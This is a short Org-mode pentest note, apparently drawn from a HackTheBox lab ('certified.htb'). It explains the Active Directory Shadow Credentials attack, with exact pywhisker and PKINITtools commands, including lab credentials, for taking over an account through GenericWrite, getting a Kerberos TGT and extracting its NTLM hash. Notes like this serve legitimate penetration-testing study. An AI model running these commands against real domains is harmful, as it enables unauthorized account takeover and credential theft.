:PROPERTIES:
:ID:       90fa1659-4cda-4c38-b534-1c6ac76c8fd1
:END:
#+title: Pentest - Active Directory - Shadow Credentials
#+filetags: :kerberos:
#+hugo_base_dir:../



* Shadow Credentials
[[https://github.com/ShutdownRepo/pywhisker][pywhisker]]

Abuse the GenericWrite ACL to get control of an account by adding shadow credentials:

#+begin_src shell -n
python3 /opt/pywhisker/pywhisker.py -d "certified.htb" -u "judith.mader" -p "judith09" --target "management_svc" --action "add"
#+end_src

The output is a PFX cert that can be used to authenticate as the user. Get a =TGT= for the user with [[https://github.com/dirkjanm/PKINITtools][PKINITtools]]:

#+begin_src shell -n
python3 /opt/PKINITtools/gettgtpkinit.py -cert-pfx vGRMeeb9.pfx certified.htb/management_svc -pfx-pass '25nQ6mg4JUTeQEjjNRE2' management_svc.ccache
#+end_src

This will create a Kerberos ticket called management_svc.ccache file, which we can export and use the key this output provides in conjunction with =getnthash.py= from the same toolkit to get the NTLM hash of the management_svc user.

** See also: [[https://github.com/ShutdownRepo/targetedKerberoast][targetedKerberos]]   [[id:38f3437e-50b7-4ff2-b10c-7da71988828f][Targeted Kerberoast]]

** Links
[[https://www.dsinternals.com/en/indicator-of-compromise-shadow-credentials-ntlm-relay-impacket/][dsinternals]]
[[https://cyberstoph.org/posts/2022/03/detecting-shadow-credentials/][Detecting shadow credentials]]
[[https://www.thehacker.recipes/ad/movement/kerberos/shadow-credentials][hacker recipes]]
[[https://www.hackingarticles.in/shadow-credentials-attack/][hackingarticles]]
[[https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab][medium]]
